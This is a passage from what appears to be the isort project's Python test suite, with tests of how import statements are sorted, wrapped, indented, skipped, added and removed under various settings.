pass\\n\")\n\n    test_input_other = (\"import sys\\n\"\n                        \"print('yo')\\n\")\n    test_output_other = SortImports(file_contents=test_input_other).output\n    assert test_output_other == (\"import sys\\n\"\n                                 \"\\n\"\n                                 \"print('yo')\\n\")\n\n\ndef test_sort_on_number():\n    \"\"\"Ensure numbers get sorted logically (10 > 9 not the other way around)\"\"\"\n    test_input = (\"import lib10\\n\"\n                  \"import lib9\\n\")\n    test_output = SortImports(file_contents=test_input).output\n    assert test_output == (\"import lib9\\n\"\n                           \"import lib10\\n\")\n\n\ndef test_line_length():\n    \"\"\"Ensure isort enforces the set line_length.\"\"\"\n    assert len(SortImports(file_contents=REALLY_LONG_IMPORT, line_length=80).output.split(\"\\n\")[0]) <= 80\n    assert len(SortImports(file_contents=REALLY_LONG_IMPORT, line_length=120).output.split(\"\\n\")[0]) <= 120\n\n    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, line_length=42).output\n    assert test_output == (\"from third_party import (lib1, lib2, lib3,\\n\"\n                           \"                         lib4, lib5, lib6,\\n\"\n                           \"                         lib7, lib8, lib9,\\n\"\n                           \"                         lib10, lib11,\\n\"\n                           \"                         lib12, lib13,\\n\"\n                           \"                         lib14, lib15,\\n\"\n                           \"                         lib16, lib17,\\n\"\n                           \"                         lib18, lib20,\\n\"\n                           \"                         lib21, lib22)\\n\")\n\n    TEST_INPUT = ('from django.contrib.gis.gdal.field import (\\n'\n                  '    OFTDate, OFTDateTime, OFTInteger, OFTInteger64, OFTReal, OFTString,\\n'\n                  '    OFTTime,\\n'\n                  ')\\n')  # Test case described in issue #654\n    assert SortImports(file_contents=TEST_INPUT, include_trailing_comma=True, line_length=79,\n                       multi_line_output=WrapModes.VERTICAL_GRID_GROUPED, balanced_wrapping=False).output == TEST_INPUT\n\n    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, line_length=42, wrap_length=32).output\n    assert test_output == (\"from third_party import (lib1,\\n\"\n                           \"                         lib2,\\n\"\n                           \"                         lib3,\\n\"\n                           \"                         lib4,\\n\"\n                           \"                         lib5,\\n\"\n                           \"                         lib6,\\n\"\n                           \"                         lib7,\\n\"\n                           \"                         lib8,\\n\"\n                           \"                         lib9,\\n\"\n                           \"                         lib10,\\n\"\n                           \"                         lib11,\\n\"\n                           \"                         lib12,\\n\"\n                           \"                         lib13,\\n\"\n                           \"                         lib14,\\n\"\n                           \"                         lib15,\\n\"\n                           \"                         lib16,\\n\"\n                           \"                         lib17,\\n\"\n                           \"                         lib18,\\n\"\n                           \"                         lib20,\\n\"\n                           \"                         lib21,\\n\"\n                           \"                         lib22)\\n\")\n\n\ndef test_output_modes():\n    \"\"\"Test setting isort to use various output modes works as expected\"\"\"\n    test_output_grid = SortImports(file_contents=REALLY_LONG_IMPORT,\n                                   multi_line_output=WrapModes.GRID, line_length=40).output\n    assert test_output_grid == (\"from third_party import (lib1, lib2,\\n\"\n                                \"                         lib3, lib4,\\n\"\n                                \"                         lib5, lib6,\\n\"\n                                \"                         lib7, lib8,\\n\"\n                                \"                         lib9, lib10,\\n\"\n                                \"                         lib11, lib12,\\n\"\n                                \"                         lib13, lib14,\\n\"\n                                \"                         lib15, lib16,\\n\"\n                                \"                         lib17, lib18,\\n\"\n                                \"                         lib20, lib21,\\n\"\n                                \"                         lib22)\\n\")\n\n    test_output_vertical = SortImports(file_contents=REALLY_LONG_IMPORT,\n                                       multi_line_output=WrapModes.VERTICAL, line_length=40).output\n    assert test_output_vertical == (\"from third_party import (lib1,\\n\"\n                                    \"                         lib2,\\n\"\n                                    \"                         lib3,\\n\"\n                                    \"                         lib4,\\n\"\n                                    \"                         lib5,\\n\"\n                                    \"                         lib6,\\n\"\n                                    \"                         lib7,\\n\"\n                                    \"                         lib8,\\n\"\n                                    \"                         lib9,\\n\"\n                                    \"                         lib10,\\n\"\n                                    \"                         lib11,\\n\"\n                                    \"                         lib12,\\n\"\n                                    \"                         lib13,\\n\"\n                                    \"                         lib14,\\n\"\n                                    \"                         lib15,\\n\"\n                                    \"                         lib16,\\n\"\n                                    \"                         lib17,\\n\"\n                                    \"                         lib18,\\n\"\n                                    \"                         lib20,\\n\"\n                                    \"                         lib21,\\n\"\n                                    \"                         lib22)\\n\")\n\n    comment_output_vertical = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,\n                                          multi_line_output=WrapModes.VERTICAL, line_length=40).output\n    assert comment_output_vertical == (\"from third_party import (lib1,  # comment\\n\"\n                                       \"                         lib2,\\n\"\n                                       \"                         lib3,\\n\"\n                                       \"                         lib4,\\n\"\n                                       \"                         lib5,\\n\"\n                                       \"                         lib6,\\n\"\n                                       \"                         lib7,\\n\"\n                                       \"                         lib8,\\n\"\n                                       \"                         lib9,\\n\"\n                                       \"                         lib10,\\n\"\n                                       \"                         lib11,\\n\"\n                                       \"                         lib12,\\n\"\n                                       \"                         lib13,\\n\"\n                                       \"                         lib14,\\n\"\n                                       \"                         lib15,\\n\"\n                                       \"                         lib16,\\n\"\n                                       \"                         lib17,\\n\"\n                                       \"                         lib18,\\n\"\n                                       \"                         lib20,\\n\"\n                                       \"                         lib21,\\n\"\n                                       \"                         lib22)\\n\")\n\n    test_output_hanging_indent = SortImports(file_contents=REALLY_LONG_IMPORT,\n                                             multi_line_output=WrapModes.HANGING_INDENT,\n                                             line_length=40, indent=\"    \").output\n    assert test_output_hanging_indent == (\"from third_party import lib1, lib2, \\\\\\n\"\n                                          \"    lib3, lib4, lib5, lib6, lib7, \\\\\\n\"\n                                          \"    lib8, lib9, lib10, lib11, lib12, \\\\\\n\"\n                                          \"    lib13, lib14, lib15, lib16, lib17, \\\\\\n\"\n                                          \"    lib18, lib20, lib21, lib22\\n\")\n\n    comment_output_hanging_indent = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,\n                                                multi_line_output=WrapModes.HANGING_INDENT,\n                                                line_length=40, indent=\"    \").output\n    assert comment_output_hanging_indent == (\"from third_party import lib1, \\\\  # comment\\n\"\n                                             \"    lib2, lib3, lib4, lib5, lib6, \\\\\\n\"\n                                             \"    lib7, lib8, lib9, lib10, lib11, \\\\\\n\"\n                                             \"    lib12, lib13, lib14, lib15, lib16, \\\\\\n\"\n                                             \"    lib17, lib18, lib20, lib21, lib22\\n\")\n\n    test_output_vertical_indent = SortImports(file_contents=REALLY_LONG_IMPORT,\n                                              multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,\n                                              line_length=40, indent=\"    \").output\n    assert test_output_vertical_indent == (\"from third_party import (\\n\"\n                                           \"    lib1,\\n\"\n                                           \"    lib2,\\n\"\n                                           \"    lib3,\\n\"\n                                           \"    lib4,\\n\"\n                                           \"    lib5,\\n\"\n                                           \"    lib6,\\n\"\n                                           \"    lib7,\\n\"\n                                           \"    lib8,\\n\"\n                                           \"    lib9,\\n\"\n                                           \"    lib10,\\n\"\n                                           \"    lib11,\\n\"\n                                           \"    lib12,\\n\"\n                                           \"    lib13,\\n\"\n                                           \"    lib14,\\n\"\n                                           \"    lib15,\\n\"\n                                           \"    lib16,\\n\"\n                                           \"    lib17,\\n\"\n                                           \"    lib18,\\n\"\n                                           \"    lib20,\\n\"\n                                           \"    lib21,\\n\"\n                                           \"    lib22\\n\"\n                                           \")\\n\")\n\n    comment_output_vertical_indent = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,\n                                                 multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,\n                                                 line_length=40, indent=\"    \").output\n    assert comment_output_vertical_indent == (\"from third_party import (  # comment\\n\"\n                                              \"    lib1,\\n\"\n                                              \"    lib2,\\n\"\n                                              \"    lib3,\\n\"\n                                              \"    lib4,\\n\"\n                                              \"    lib5,\\n\"\n                                              \"    lib6,\\n\"\n                                              \"    lib7,\\n\"\n                                              \"    lib8,\\n\"\n                                              \"    lib9,\\n\"\n                                              \"    lib10,\\n\"\n                                              \"    lib11,\\n\"\n                                              \"    lib12,\\n\"\n                                              \"    lib13,\\n\"\n                                              \"    lib14,\\n\"\n                                              \"    lib15,\\n\"\n                                              \"    lib16,\\n\"\n                                              \"    lib17,\\n\"\n                                              \"    lib18,\\n\"\n                                              \"    lib20,\\n\"\n                                              \"    lib21,\\n\"\n                                              \"    lib22\\n\"\n                                              \")\\n\")\n\n    test_output_vertical_grid = SortImports(file_contents=REALLY_LONG_IMPORT,\n                                            multi_line_output=WrapModes.VERTICAL_GRID,\n                                            line_length=40, indent=\"    \").output\n    assert test_output_vertical_grid == (\"from third_party import (\\n\"\n                                         \"    lib1, lib2, lib3, lib4, lib5, lib6,\\n\"\n                                         \"    lib7, lib8, lib9, lib10, lib11,\\n\"\n                                         \"    lib12, lib13, lib14, lib15, lib16,\\n\"\n                                         \"    lib17, lib18, lib20, lib21, lib22)\\n\")\n\n    comment_output_vertical_grid = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,\n                                               multi_line_output=WrapModes.VERTICAL_GRID,\n                                               line_length=40, indent=\"    \").output\n    assert comment_output_vertical_grid == (\"from third_party import (  # comment\\n\"\n                                            \"    lib1, lib2, lib3, lib4, lib5, lib6,\\n\"\n                                            \"    lib7, lib8, lib9, lib10, lib11,\\n\"\n                                            \"    lib12, lib13, lib14, lib15, lib16,\\n\"\n                                            \"    lib17, lib18, lib20, lib21, lib22)\\n\")\n\n    test_output_vertical_grid_grouped = SortImports(file_contents=REALLY_LONG_IMPORT,\n                                                    multi_line_output=WrapModes.VERTICAL_GRID_GROUPED,\n                                                    line_length=40, indent=\"    \").output\n    assert test_output_vertical_grid_grouped == (\"from third_party import (\\n\"\n                                                 \"    lib1, lib2, lib3, lib4, lib5, lib6,\\n\"\n                                                 \"    lib7, lib8, lib9, lib10, lib11,\\n\"\n                                                 \"    lib12, lib13, lib14, lib15, lib16,\\n\"\n                                                 \"    lib17, lib18, lib20, lib21, lib22\\n\"\n                                                 \")\\n\")\n\n    comment_output_vertical_grid_grouped = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,\n                                                       multi_line_output=WrapModes.VERTICAL_GRID_GROUPED,\n                                                       line_length=40, indent=\"    \").output\n    assert comment_output_vertical_grid_grouped == (\"from third_party import (  # comment\\n\"\n                                                    \"    lib1, lib2, lib3, lib4, lib5, lib6,\\n\"\n                                                    \"    lib7, lib8, lib9, lib10, lib11,\\n\"\n                                                    \"    lib12, lib13, lib14, lib15, lib16,\\n\"\n                                                    \"    lib17, lib18, lib20, lib21, lib22\\n\"\n                                                    \")\\n\")\n\n    output_noqa = SortImports(file_contents=REALLY_LONG_IMPORT_WITH_COMMENT,\n                              multi_line_output=WrapModes.NOQA).output\n    assert output_noqa == (\"from third_party import lib1, lib2, lib3, lib4, lib5, lib6, lib7, lib8, lib9, lib10, lib11,\"\n                           \" lib12, lib13, lib14, lib15, lib16, lib17, lib18, lib20, lib21, lib22  \"\n                           \"# NOQA comment\\n\")\n\n    test_case = SortImports(file_contents=SINGLE_LINE_LONG_IMPORT,\n                            multi_line_output=WrapModes.VERTICAL_GRID_GROUPED_NO_COMMA,\n                            line_length=40, indent='    ').output\n    test_output_vertical_grid_grouped_doesnt_wrap_early = test_case\n    assert test_output_vertical_grid_grouped_doesnt_wrap_early == (\"from third_party import (\\n\"\n                                                                   \"    lib1, lib2, lib3, lib4, lib5, lib5ab\\n\"\n                                                                   \")\\n\")\n\n\ndef test_qa_comment_case():\n    test_input = \"from veryveryveryveryveryveryveryveryveryveryvery import X  # NOQA\"\n    test_output = SortImports(file_contents=test_input, line_length=40, multi_line_output=WrapModes.NOQA).output\n    assert test_output == \"from veryveryveryveryveryveryveryveryveryveryvery import X  # NOQA\\n\"\n\n    test_input = \"import veryveryveryveryveryveryveryveryveryveryvery  # NOQA\"\n    test_output = SortImports(file_contents=test_input, line_length=40, multi_line_output=WrapModes.NOQA).output\n    assert test_output == \"import veryveryveryveryveryveryveryveryveryveryvery  # NOQA\\n\"\n\n\ndef test_length_sort():\n    \"\"\"Test setting isort to sort on length instead of alphabetically.\"\"\"\n    test_input = (\"import medium_sizeeeeeeeeeeeeee\\n\"\n                  \"import shortie\\n\"\n                  \"import looooooooooooooooooooooooooooooooooooooong\\n\"\n                  \"import medium_sizeeeeeeeeeeeeea\\n\")\n    test_output = SortImports(file_contents=test_input, length_sort=True).output\n    assert test_output == (\"import shortie\\n\"\n                           \"import medium_sizeeeeeeeeeeeeea\\n\"\n                           \"import medium_sizeeeeeeeeeeeeee\\n\"\n                           \"import looooooooooooooooooooooooooooooooooooooong\\n\")\n\n\ndef test_length_sort_section():\n    \"\"\"Test setting isort to sort on length instead of alphabetically for a specific section.\"\"\"\n    test_input = (\"import medium_sizeeeeeeeeeeeeee\\n\"\n                  \"import shortie\\n\"\n                  \"import sys\\n\"\n                  \"import os\\n\"\n                  \"import looooooooooooooooooooooooooooooooooooooong\\n\"\n                  \"import medium_sizeeeeeeeeeeeeea\\n\")\n    test_output = SortImports(file_contents=test_input, length_sort_stdlib=True).output\n    assert test_output == (\"import os\\n\"\n                           \"import sys\\n\"\n                           \"\\n\"\n                           \"import looooooooooooooooooooooooooooooooooooooong\\n\"\n                           \"import medium_sizeeeeeeeeeeeeea\\n\"\n                           \"import medium_sizeeeeeeeeeeeeee\\n\"\n                           \"import shortie\\n\")\n\n\ndef test_convert_hanging():\n    \"\"\"Ensure that isort will convert hanging indents to correct indent\n    method.\"\"\"\n    test_input = (\"from third_party import lib1, lib2, \\\\\\n\"\n                  \"    lib3, lib4, lib5, lib6, lib7, \\\\\\n\"\n                  \"    lib8, lib9, lib10, lib11, lib12, \\\\\\n\"\n                  \"    lib13, lib14, lib15, lib16, lib17, \\\\\\n\"\n                  \"    lib18, lib20, lib21, lib22\\n\")\n    test_output = SortImports(file_contents=test_input, multi_line_output=WrapModes.GRID,\n                              line_length=40).output\n    assert test_output == (\"from third_party import (lib1, lib2,\\n\"\n                           \"                         lib3, lib4,\\n\"\n                           \"                         lib5, lib6,\\n\"\n                           \"                         lib7, lib8,\\n\"\n                           \"                         lib9, lib10,\\n\"\n                           \"                         lib11, lib12,\\n\"\n                           \"                         lib13, lib14,\\n\"\n                           \"                         lib15, lib16,\\n\"\n                           \"                         lib17, lib18,\\n\"\n                           \"                         lib20, lib21,\\n\"\n                           \"                         lib22)\\n\")\n\n\ndef test_custom_indent():\n    \"\"\"Ensure setting a custom indent will work as expected.\"\"\"\n    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, multi_line_output=WrapModes.HANGING_INDENT,\n                              line_length=40, indent=\"   \", balanced_wrapping=False).output\n    assert test_output == (\"from third_party import lib1, lib2, \\\\\\n\"\n                           \"   lib3, lib4, lib5, lib6, lib7, lib8, \\\\\\n\"\n                           \"   lib9, lib10, lib11, lib12, lib13, \\\\\\n\"\n                           \"   lib14, lib15, lib16, lib17, lib18, \\\\\\n\"\n                           \"   lib20, lib21, lib22\\n\")\n\n    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, multi_line_output=WrapModes.HANGING_INDENT,\n                              line_length=40, indent=\"'  '\", balanced_wrapping=False).output\n    assert test_output == (\"from third_party import lib1, lib2, \\\\\\n\"\n                           \"  lib3, lib4, lib5, lib6, lib7, lib8, \\\\\\n\"\n                           \"  lib9, lib10, lib11, lib12, lib13, \\\\\\n\"\n                           \"  lib14, lib15, lib16, lib17, lib18, \\\\\\n\"\n                           \"  lib20, lib21, lib22\\n\")\n\n    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, multi_line_output=WrapModes.HANGING_INDENT,\n                              line_length=40, indent=\"tab\", balanced_wrapping=False).output\n    assert test_output == (\"from third_party import lib1, lib2, \\\\\\n\"\n                           \"\\tlib3, lib4, lib5, lib6, lib7, lib8, \\\\\\n\"\n                           \"\\tlib9, lib10, lib11, lib12, lib13, \\\\\\n\"\n                           \"\\tlib14, lib15, lib16, lib17, lib18, \\\\\\n\"\n                           \"\\tlib20, lib21, lib22\\n\")\n\n    test_output = SortImports(file_contents=REALLY_LONG_IMPORT, multi_line_output=WrapModes.HANGING_INDENT,\n                              line_length=40, indent=2, balanced_wrapping=False).output\n    assert test_output == (\"from third_party import lib1, lib2, \\\\\\n\"\n                           \"  lib3, lib4, lib5, lib6, lib7, lib8, \\\\\\n\"\n                           \"  lib9, lib10, lib11, lib12, lib13, \\\\\\n\"\n                           \"  lib14, lib15, lib16, lib17, lib18, \\\\\\n\"\n                           \"  lib20, lib21, lib22\\n\")\n\n\ndef test_use_parentheses():\n    test_input = (\n        \"from fooooooooooooooooooooooooo.baaaaaaaaaaaaaaaaaaarrrrrrr import \"\n        \"    my_custom_function as my_special_function\"\n    )\n    test_output = SortImports(\n        file_contents=test_input, line_length=79, use_parentheses=True\n    ).output\n\n    assert test_output == (\n        \"from fooooooooooooooooooooooooo.baaaaaaaaaaaaaaaaaaarrrrrrr import (\\n\"\n        \"    my_custom_function as my_special_function)\\n\"\n    )\n\n    test_output = SortImports(\n        file_contents=test_input, line_length=79, use_parentheses=True,\n        include_trailing_comma=True,\n    ).output\n\n    assert test_output == (\n        \"from fooooooooooooooooooooooooo.baaaaaaaaaaaaaaaaaaarrrrrrr import (\\n\"\n        \"    my_custom_function as my_special_function,)\\n\"\n    )\n\n    test_output = SortImports(\n        file_contents=test_input, line_length=79, use_parentheses=True,\n        multi_line_output=WrapModes.VERTICAL_HANGING_INDENT\n    ).output\n\n    assert test_output == (\n        \"from fooooooooooooooooooooooooo.baaaaaaaaaaaaaaaaaaarrrrrrr import (\\n\"\n        \"    my_custom_function as my_special_function\\n)\\n\"\n    )\n\n    test_output = SortImports(\n        file_contents=test_input, line_length=79, use_parentheses=True,\n        multi_line_output=WrapModes.VERTICAL_GRID_GROUPED,\n        include_trailing_comma=True\n    ).output\n\n    assert test_output == (\n        \"from fooooooooooooooooooooooooo.baaaaaaaaaaaaaaaaaaarrrrrrr import (\\n\"\n        \"    my_custom_function as my_special_function,\\n)\\n\"\n    )\n\n\ndef test_skip():\n    \"\"\"Ensure skipping a single import will work as expected.\"\"\"\n    test_input = (\"import myproject\\n\"\n                  \"import django\\n\"\n                  \"print('hey')\\n\"\n                  \"import sys  # isort:skip this import needs to be placed here\\n\\n\\n\\n\\n\\n\\n\")\n\n    test_output = SortImports(file_contents=test_input, known_third_party=['django']).output\n    assert test_output == (\"import django\\n\"\n                           \"\\n\"\n                           \"import myproject\\n\"\n                           \"\\n\"\n                           \"print('hey')\\n\"\n                           \"import sys  # isort:skip this import needs to be placed here\\n\")\n\n\ndef test_skip_with_file_name():\n    \"\"\"Ensure skipping a file works even when file_contents is provided.\"\"\"\n    test_input = (\"import django\\n\"\n                  \"import myproject\\n\")\n\n    sort_imports = SortImports(file_path='/baz.py', file_contents=test_input, settings_path=os.getcwd(),\n                               skip=['baz.py'])\n    assert sort_imports.skipped\n    assert sort_imports.output is None\n\n\ndef test_skip_within_file():\n    \"\"\"Ensure skipping a whole file works.\"\"\"\n    test_input = (\"# isort:skip_file\\n\"\n                  \"import django\\n\"\n                  \"import myproject\\n\")\n    sort_imports = SortImports(file_contents=test_input, known_third_party=['django'])\n    assert sort_imports.skipped\n    assert sort_imports.output is None\n\n\ndef test_force_to_top():\n    \"\"\"Ensure forcing a single import to the top of its category works as expected.\"\"\"\n    test_input = (\"import lib6\\n\"\n                  \"import lib2\\n\"\n                  \"import lib5\\n\"\n                  \"import lib1\\n\")\n    test_output = SortImports(file_contents=test_input, force_to_top=['lib5']).output\n    assert test_output == (\"import lib5\\n\"\n                           \"import lib1\\n\"\n                           \"import lib2\\n\"\n                           \"import lib6\\n\")\n\n\ndef test_add_imports():\n    \"\"\"Ensures adding imports works as expected.\"\"\"\n    test_input = (\"import lib6\\n\"\n                  \"import lib2\\n\"\n                  \"import lib5\\n\"\n                  \"import lib1\\n\\n\")\n    test_output = SortImports(file_contents=test_input, add_imports=['import lib4', 'import lib7']).output\n    assert test_output == (\"import lib1\\n\"\n                           \"import lib2\\n\"\n                           \"import lib4\\n\"\n                           \"import lib5\\n\"\n                           \"import lib6\\n\"\n                           \"import lib7\\n\")\n\n    # Using simplified syntax\n    test_input = (\"import lib6\\n\"\n                  \"import lib2\\n\"\n                  \"import lib5\\n\"\n                  \"import lib1\\n\\n\")\n    test_output = SortImports(file_contents=test_input, add_imports=['lib4', 'lib7', 'lib8.a']).output\n    assert test_output == (\"import lib1\\n\"\n                           \"import lib2\\n\"\n                           \"import lib4\\n\"\n                           \"import lib5\\n\"\n                           \"import lib6\\n\"\n                           \"import lib7\\n\"\n                           \"from lib8 import a\\n\")\n\n    # On a file that has no pre-existing imports\n    test_input = ('\"\"\"Module docstring\"\"\"\\n'\n                  '\\n'\n                  'class MyClass(object):\\n'\n                  '    pass\\n')\n    test_output = SortImports(file_contents=test_input, add_imports=['from __future__ import print_function']).output\n    assert test_output == ('\"\"\"Module docstring\"\"\"\\n'\n                           'from __future__ import print_function\\n'\n                           '\\n'\n                           '\\n'\n                           'class MyClass(object):\\n'\n                           '    pass\\n')\n\n    # On a file that has no pre-existing imports, and no doc-string\n    test_input = ('class MyClass(object):\\n'\n                  '    pass\\n')\n    test_output = SortImports(file_contents=test_input, add_imports=['from __future__ import print_function']).output\n    assert test_output == ('from __future__ import print_function\\n'\n                           '\\n'\n                           '\\n'\n                           'class MyClass(object):\\n'\n                           '    pass\\n')\n\n    # On a file with no content what so ever\n    test_input = (\"\")\n    test_output = SortImports(file_contents=test_input, add_imports=['lib4']).output\n    assert test_output == (\"\")\n\n    # On a file with no content what so ever, after force_adds is set to True\n    test_input = (\"\")\n    test_output = SortImports(file_contents=test_input, add_imports=['lib4'], force_adds=True).output\n    assert test_output == (\"import lib4\\n\")\n\n\ndef test_remove_imports():\n    \"\"\"Ensures removing imports works as expected.\"\"\"\n    test_input = (\"import lib6\\n\"\n                  \"import lib2\\n\"\n                  \"import lib5\\n\"\n                  \"import lib1\")\n    test_output = SortImports(file_contents=test_input, remove_imports=['lib2', 'lib6']).output\n    assert test_output == (\"import lib1\\n\"\n                           \"import lib5\\n\")\n\n    # Using natural syntax\n    test_input = (\"import lib6\\n\"\n                  \"import lib2\\n\"\n                  \"import lib5\\n\"\n                  \"import lib1\\n\"\n                  \"from lib8 import a\")\n    test_output = SortImports(file_contents=test_input, remove_imports=['import lib2', 'import lib6',\n                                                                        'from lib8 import a']).output\n    assert test_output == (\"import lib1\\n\"\n                           \"import lib5\\n\")\n\n\ndef test_explicitly_local_import():\n    \"\"\"Ensure that explicitly local imports are separated.\"\"\"\n    test_input = (\"import lib1\\n\"\n                  \"import lib2\\n\"\n                  \"import .lib6\\n\"\n                  \"from . import lib7\")\n    assert SortImports(file_contents=test_input).output == (\"import lib1\\n\"\n                                                            \"import lib2\\n\"\n                                                            \"\\n\"\n                                                            \"import .lib6\\n\"\n                                                            \"from . import lib7\\n\")\n\n\ndef test_quotes_in_file():\n    \"\"\"Ensure imports within triple quotes don't get imported.\"\"\"\n    test_input = ('import os\\n'\n                  '\\n'\n                  '\"\"\"\\n'\n                  'Let us\\n'\n                  'import foo\\n'\n                  'okay?\\n'\n                  '\"\"\"\\n')\n    assert SortImports(file_contents=test_input).output == test_input\n\n    test_input = ('import os\\n'\n                  '\\n'\n                  \"'\\\"\\\"\\\"'\\n\"\n                  'import foo\\n')\n    assert SortImports(file_contents=test_input).output == ('import os\\n'\n                                                            '\\n'\n                                                            'import foo\\n'\n                                                            '\\n'\n                                                            \"'\\\"\\\"\\\"'\\n\")\n\n    test_input = ('import os\\n'\n                  '\\n'\n                  '\"\"\"Let us\"\"\"\\n'\n                  'import foo\\n'\n                  '\"\"\"okay?\"\"\"\\n')\n    assert SortImports(file_contents=test_input).output == ('import os\\n'\n                                                            '\\n'\n                                                            'import foo\\n'\n                                                            '\\n'\n                                                            '\"\"\"Let us\"\"\"\\n'\n                                                            '\"\"\"okay?\"\"\"\\n')\n\n    test_input = ('import os\\n'\n                  '\\n'\n                  '#\"\"\"\\n'\n                  'import foo\\n'\n                  '#\"\"\"')\n    assert SortImports(file_contents=test_input).output == ('import os\\n'\n                                                            '\\n'\n                                                            'import foo\\n'\n                                                            '\\n'\n                                                            '#\"\"\"\\n'\n                                                            '#\"\"\"\\n')\n\n    test_input = ('import os\\n'\n                  '\\n'\n                  \"'\\\\\\n\"\n                  \"import foo'\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n\n    test_input = ('import os\\n'\n                  '\\n'\n                  \"'''\\n\"\n                  \"\\\\'''\\n\"\n                  'import junk\\n'\n                  \"'''\\n\")\n    assert SortImports(file_contents=test_input).output == test_input\n\n\ndef test_check_newline_in_imports(capsys):\n    \"\"\"Ensure tests works correctly when new lines are in imports.\"\"\"\n    test_input = ('from lib1 import (\\n'\n                  '    sub1,\\n'\n                  '    sub2,\\n'\n                  '    sub3\\n)\\n')\n\n    SortImports(file_contents=test_input, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT, line_length=20,\n                check=True, verbose=True)\n    out, err = capsys.readouterr()\n    assert 'SUCCESS' in out\n\n\ndef test_forced_separate():\n    \"\"\"Ensure that forcing certain sub modules to show separately works as expected.\"\"\"\n    test_input = ('import sys\\n'\n                  'import warnings\\n'\n                  'from collections import OrderedDict\\n'\n                  '\\n'\n                  'from django.core.exceptions import ImproperlyConfigured, SuspiciousOperation\\n'\n                  'from django.core.paginator import InvalidPage\\n'\n                  'from django.core.urlresolvers import reverse\\n'\n                  'from django.db import models\\n'\n                  'from django.db.models.fields import FieldDoesNotExist\\n'\n                  'from django.utils import six\\n'\n                  'from django.utils.deprecation import RenameMethodsBase\\n'\n                  'from django.utils.encoding import force_str, force_text\\n'\n                  'from django.utils.http import urlencode\\n'\n                  'from django.utils.translation import ugettext, ugettext_lazy\\n'\n                  '\\n'\n                  'from django.contrib.admin import FieldListFilter\\n'\n                  'from django.contrib.admin.exceptions import DisallowedModelAdminLookup\\n'\n                  'from django.contrib.admin.options import IncorrectLookupParameters, IS_POPUP_VAR, TO_FIELD_VAR\\n')\n    assert SortImports(file_contents=test_input, forced_separate=['django.contrib'],\n                       known_third_party=['django'], line_length=120, order_by_type=False).output == test_input\n\n    test_input = ('from .foo import bar\\n'\n                  '\\n'\n                  'from .y import ca\\n')\n    assert SortImports(file_contents=test_input, forced_separate=['.y'],\n                       line_length=120, order_by_type=False).output == test_input\n\n\ndef test_default_section():\n    \"\"\"Test to ensure changing the default section works as expected.\"\"\"\n    test_input = (\"import sys\\n\"\n                  \"import os\\n\"\n                  \"import myproject.test\\n\"\n                  \"import django.settings\")\n    test_output = SortImports(file_contents=test_input, known_third_party=['django'],\n                              default_section=\"FIRSTPARTY\").output\n    assert test_output == (\"import os\\n\"\n                           \"import sys\\n\"\n                           \"\\n\"\n                           \"import django.settings\\n\"\n                           \"\\n\"\n                           \"import myproject.test\\n\")\n\n    test_output_custom = SortImports(file_contents=test_input, known_third_party=['django'],\n                                     default_section=\"STDLIB\").output\n    assert test_output_custom == (\"import myproject.test\\n\"\n                                  \"import os\\n\"\n                                  \"import sys\\n\"\n                                  \"\\n\"\n                                  \"import django.settings\\n\")\n\n\ndef test_first_party_overrides_standard_section():\n    \"\"\"Test to ensure changing the default section works as expected.\"\"\"\n    test_input = (\"from HTMLParser import HTMLParseError, HTMLParser\\n\"\n                  \"import sys\\n\"\n                  \"import os\\n\"\n                  \"import this\\n\"\n                  \"import profile.test\\n\")\n    test_output = SortImports(file_contents=test_input, known_first_party=['profile']).output\n    assert test_output == (\"import os\\n\"\n                           \"import sys\\n\"\n                           \"import this\\n\"\n                           \"from HTMLParser import HTMLParseError, HTMLParser\\n\"\n                           \"\\n\"\n                           \"import profile.test\\n\")\n\n\ndef test_thirdy_party_overrides_standard_section():\n    \"\"\"Test to ensure changing the default section works as expected.\"\"\"\n    test_input = (\"import sys\\n\"\n                  \"import os\\n\"\n                  \"import this\\n\"\n                  \"import profile.test\\n\")\n    test_output = SortImports(file_contents=test_input, known_third_party=['profile']).output\n    assert test_output == (\"import os\\n\"\n                           \"import sys\\n\"\n                           \"import this\\n\"\n                           \"\\n\"\n                           \"import profile.test\\n\")\n\n\ndef test_known_pattern_path_expansion():\n    \"\"\"Test to ensure patterns ending with path sep gets expanded and nested packages treated as known patterns\"\"\"\n    test_input = (\"from kate_plugin import isort_plugin\\n\"\n                  \"import sys\\n\"\n                  \"import isort.settings\\n\"\n                  \"import this\\n\"\n                  \"import os\\n\")\n    test_output = SortImports(\n        file_contents=test_input,\n        default_section='THIRDPARTY',\n        known_first_party=['./', 'this', 'kate_plugin']\n    ).output\n    assert test_output == (\"import os\\n\"\n                            \"import sys\\n\"\n                            \"\\n\"\n                            \"import isort.settings\\n\"\n                            \"import this\\n\"\n                            \"from kate_plugin import isort_plugin\\n\")\n\n\ndef test_force_single_line_imports():\n    \"\"\"Test to ensure forcing imports to each have their own line works as expected.\"\"\"\n    test_input = (\"from third_party import lib1, lib2, \\\\\\n\"\n                  \"    lib3, lib4, lib5, lib6, lib7, \\\\\\n\"\n                  \"    lib8, lib9, lib10, lib11, lib12, \\\\\\n\"\n                  \"    lib13, lib14, lib15, lib16, lib17, \\\\\\n\"\n                  \"    lib18, lib20, lib21, lib22\\n\")\n    test_output = SortImports(file_contents=test_input, multi_line_output=WrapModes.GRID,\n                              line_length=40, force_single_line=True).output\n    assert test_output == (\"from third_party import lib1\\n\"\n                           \"from third_party import lib2\\n\"\n                           \"from third_party import lib3\\n\"\n                           \"from third_party import lib4\\n\"\n                           \"from third_party import lib5\\n\"\n                           \"from third_party import lib6\\n\"\n                           \"from third_party import lib7\\n\"\n                           \"from third_party import lib8\\n\"\n                           \"from third_party import lib9\\n\"\n                           \"from third_party import lib10\\n\"\n                           \"from third_party import lib11\\n\"\n                           \"from third_party import lib12\\n\"\n                           \"from third_party import 